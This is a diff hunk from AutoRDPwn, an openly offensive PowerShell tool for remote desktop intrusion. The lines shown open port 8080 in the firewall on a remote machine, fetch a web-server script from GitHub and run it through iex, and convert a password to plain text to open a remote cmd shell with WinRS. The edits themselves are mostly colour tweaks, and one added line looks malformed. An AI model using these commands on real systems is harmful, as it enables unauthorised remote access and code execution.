@@ -440,10 +440,10 @@ Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AutoRDPwn" -
 Write-Host "" ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host $txt28 ; sleep -milliseconds 3000 
 if ($webserver){ invoke-command -session $RDP[0] -scriptblock { netsh advfirewall firewall delete rule name="Powershell Webserver" 2>&1> $null
 netsh advfirewall firewall add rule name="Powershell Webserver" dir=in action=allow protocol=TCP localport=8080 2>&1> $null ; Write-Host ""
-Write-Host "----------------------------------------------------------------------"
+Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
 Write-Host "Powershell Web Server -->` " -NoNewLine -ForegroundColor Green ; Write-Host http://$using:computer`:8080 -ForegroundColor Blue 
-Write-Host "----------------------------------------------------------------------" ; sleep -milliseconds 4000
-hh http://$using:computer`:8080 ; Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Start-WebServer.ps1 -UseBasicParsing | iex 2>&1> $null }}
+Write-Host "----------------------------------------------------------------------" ; -ForegroundColor Gray ; sleep -milliseconds 4000
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Start-WebServer.ps1 -UseBasicParsing | iex 2>&1> $null }}
 
 if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt29 <<" ; Write-Host "" ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
 else { Write-Host "" ; Write-Host "$txt30" -ForegroundColor Red ; sleep -milliseconds 3000 }} if($tsfail) { Write-Host "" ; Write-Host "$txt30" -ForegroundColor Red ; sleep -milliseconds 3000 }}
